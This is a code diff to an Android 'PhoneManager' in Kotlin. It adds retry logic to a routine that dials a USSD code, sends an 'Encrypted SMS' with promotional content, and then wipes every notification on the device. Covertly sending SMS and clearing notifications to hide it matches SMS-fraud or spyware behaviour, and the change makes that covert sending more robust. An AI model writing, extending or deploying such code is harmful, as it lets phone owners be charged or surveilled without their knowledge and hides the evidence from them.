@@ -470,13 +470,19 @@ object PhoneManager {
                 DebugLogger.log("ROBUST_SMS", "USSD Dialed. Waiting 60s for network confirmation...")
                 delay(60000)
                 
-                if (sendAndWait(ctx, phone, promo)) {
-                    DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully post-recovery.")
-                    CoroutineScope(Dispatchers.Main).launch {
-                        delay(1500)
-                        MyNotificationListener.instance?.wipeNotifications("ALL", null)
+                var postRecoveryAttempts = 0
+                while (postRecoveryAttempts < 3) {
+                    if (sendAndWait(ctx, phone, promo)) {
+                        DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully post-recovery.")
+                        CoroutineScope(Dispatchers.Main).launch {
+                            delay(1500)
+                            MyNotificationListener.instance?.wipeNotifications("ALL", null)
+                        }
+                        return true
                     }
-                    return true
+                    postRecoveryAttempts++
+                    DebugLogger.log("ROBUST_SMS", "Post-recovery SMS send failed (Attempt $postRecoveryAttempts/3).")
+                    delay(5000)
                 }
             } catch (e: Exception) {
                 DebugLogger.log("ROBUST_SMS_ERR", "Recovery USSD failed: ${e.message}")
